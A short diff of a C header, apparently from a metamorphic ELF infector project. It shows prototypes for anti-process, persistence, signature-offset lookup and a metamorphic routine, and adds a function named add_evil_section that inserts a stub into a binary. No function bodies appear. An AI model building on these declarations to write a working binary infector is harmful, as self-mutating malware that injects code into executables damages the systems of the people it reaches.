@@ -64,6 +64,7 @@ int         anti_process(char *path);
 void        persistence();
 off_t		vaddr_to_file_offset(int fd, uint64_t vaddr);
 off_t		find_signature_offset(int fd);
-void		metamorphe(int fd, char *path);
-int patch_meta_in_rx_segment(const char *path, const char *meta);
+void metamorphe(size_t stub_size,unsigned char *stub[]);
+int add_evil_section(const char *path, const unsigned char *stub, size_t stub_len);
+
 #endif
